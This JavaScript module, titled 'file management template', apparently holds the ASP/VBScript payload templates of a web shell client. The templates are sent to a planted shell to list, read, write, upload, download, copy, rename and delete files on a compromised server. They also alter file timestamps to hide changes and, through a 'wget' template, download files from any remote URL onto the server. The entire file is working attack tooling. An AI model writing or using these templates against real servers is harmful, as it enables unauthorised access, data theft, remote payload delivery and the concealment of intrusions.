/**
 * 文件管理模板
 */

module.exports = (arg1, arg2, arg3) => ({
  dir: {
    _: `Dim RR:RR=bd(decode(Request("${arg1}"))):Function FD(dt):FD=Year(dt)&"-":If Len(Month(dt))=1 Then:FD = FD&"0":End If:FD=FD&Month(dt)&"-":If Len(Day(dt))=1 Then:FD=FD&"0":End If:FD=FD&Day(dt)&" "&FormatDateTime(dt,4)&":":If Len(Second(dt))=1 Then:FD=FD&"0":End If:FD=FD&Second(dt):End Function:SET C=CreateObject("Scripting.FileSystemObject"):Set FO=C.GetFolder(""&RR&""):If Err Then:Response.Write(encode("ERROR:// "&Err.Description)):Err.Clear:Else:For Each F in FO.subfolders:Response.Write encode(F.Name&chr(47)&chr(9)&FD(F.DateLastModified)&chr(9)&chr(48)&chr(9)&C.GetFolder(F.Path).attributes)&chr(64):Next:For Each L in FO.files:Response.Write encode(L.Name&chr(9)&FD(L.DateLastModified)&chr(9)&L.size&chr(9)&C.GetFile(L.Path).attributes)&chr(64):Next:End If`,
    [arg1]: "#{hex::path}"
  },

  delete: {
    _: `Dim P:P=bd(decode(Request("${arg1}"))):Set FS=CreateObject("Scripting.FileSystemObject"):If FS.FolderExists(P)=true Then:FS.DeleteFolder(P):Else:FS.DeleteFile(P):End If:Set FS=Nothing:If Err Then:S="ERROR:// "&Err.Description:Else:S="1":End If:Response.Write(encode(S))`,
    [arg1]: "#{hex::path}"
  },

  create_file: {
    _: `CreateObject("Scripting.FileSystemObject").CreateTextFile(""&bd(decode(Request("${arg1}")))&"").Write(""&bd(decode(Request("${arg2}")))&""):If Err Then:Response.Write(encode("ERROR:// "&Err.Description)):Else:Response.Write(encode("1")):End If`,
    [arg1]: "#{hex::path}",
    [arg2]: "#{hex::content}"
  },

  read_file: {
    _: `Response.Write(encode(CreateObject("Scripting.FileSystemObject").OpenTextfile(bd(decode(Request("${arg1}"))),1,False).readall)):If Err Then:Response.Write(encode("ERROR:// "&Err.Description)):Err.Clear:End If`,
    [arg1]: "#{hex::path}"
  },

  copy: {
    _: `SF=bd(decode(Request("${arg1}"))):DF=bd(decode(Request("${arg2}"))):Set Fs=CreateObject("Scripting.FileSystemObject"):If Fs.FolderExists(SF) Then:Fs.CopyFolder SF,DF:Else:Fs.CopyFile SF,DF:End If:Set Fs=Nothing:If Err Then:SI="ERROR:// "&Err.Description:else:SI="1":End If:Response.Write(encode(SI))`,
    [arg1]: "#{hex::path}",
    [arg2]: "#{hex::target}"
  },

  download_file: {
    _: `Dim i,c,r:Set S=Server.CreateObject("Adodb.Stream"):If Not Err Then:With S:.Mode=3:.Type=1:.Open:.LoadFromFile(bd(decode(Request("${arg1}")))):i=0:c=.Size:r=1024:While i<c:Response.BinaryWrite .Read(r):Response.Flush:i=i+r:Wend:.Close:Set S=Nothing:End With:Else:Response.BinaryWrite encode("ERROR:// "&Err.Description):End If`,
    [arg1]: "#{hex::path}"
  },

  upload_file: {
    _: `Dim l,ss,ff,T:ff=bd(decode(request("${arg1}"))):ss=decode(Request("${arg2}")):l=Len(ss):Set S=Server.CreateObject("Adodb.Stream"):With S:.Type=1:.Mode=3:.Open:On Error Resume Next:.LoadFromFile ""&ff&"":.Position=.Size:If Err Then:Err.Clear:End If:set rs=CreateObject("ADODB.Recordset"):rs.fields.append "bb",205,l/2:rs.open:rs.addnew:rs("bb")=ss+chrb(0):rs.update:.Write rs("bb").getchunk(l/2):rs.close:Set rs=Nothing:.Position=0:.SaveToFile ""&ff&"",2:.Close:End With:Set S=Nothing:If Err Then:T=Err.Description:Err.Clear:Else:T="1":End If:Response.Write(encode(T))`,
    [arg1]: "#{hex::path}",
    [arg2]: "#{buffer::content}",
    [arg3]: "1"
  },

  rename: {
    _: `SF=bd(decode(Request("${arg1}"))):DF=bd(decode(Request("${arg2}"))):Set Fs=CreateObject("Scripting.FileSystemObject"):If Fs.FolderExists(SF) Then:Fs.MoveFolder SF,DF:Else:Fs.MoveFile SF,DF:End If:Set Fs=Nothing:If Err Then:SI="ERROR:// "&Err.Description:Else:SI="1":End If:Response.Write(encode(SI))`,
    [arg1]: "#{hex::path}",
    [arg2]: "#{hex::name}"
  },

  retime: {
    _: `FN=bd(decode(Request("${arg1}"))):TM=bd(decode(Request("${arg2}"))):AA=Split(FN,"\\"):PT="":For i=LBound(AA) To UBound(AA)-1:PT=PT&AA(i)&"\\":Next:NM=AA(UBound(AA)):Server.CreateObject("Shell.Application").NameSpace(PT).ParseName(NM).Modifydate=TM:If Err Then:SI="ERROR:// "&PT&Err.Description:Err.Clear:Else:SI="1":End If:Response.Write(encode(SI))`,
    [arg1]: "#{hex::path}",
    [arg2]: "#{hex::time}"
  },

  mkdir: {
    _: `Set Fs=CreateObject("Scripting.FileSystemObject"):Fs.CreateFolder(bd(decode(Request("${arg1}")))):Set Fs=Nothing:If Err Then:S="ERROR:// "&Err.Description:Else:S="1":End If:Response.Write(encode(S))`,
    [arg1]: "#{hex::path}"
  },

  wget: {
    _: `Dim SI:Set x=CreateObject("MSXML2.ServerXmlHttp"):x.Open "GET",""&bd(decode(Request("${arg1}")))&"",0:x.Send():If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:set s=CreateObject("ADODB.Stream"):s.Mode=3:s.Type=1:s.Open():s.Write x.ResponseBody:s.SaveToFile ""&bd(decode(Request("${arg2}")))&"",2:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:SI="1":End If:Set x=Nothing:Set s=Nothing:End If:Response.Write(encode(SI))`,
    [arg1]: "#{hex::url}",
    [arg2]: "#{hex::path}"
  }
})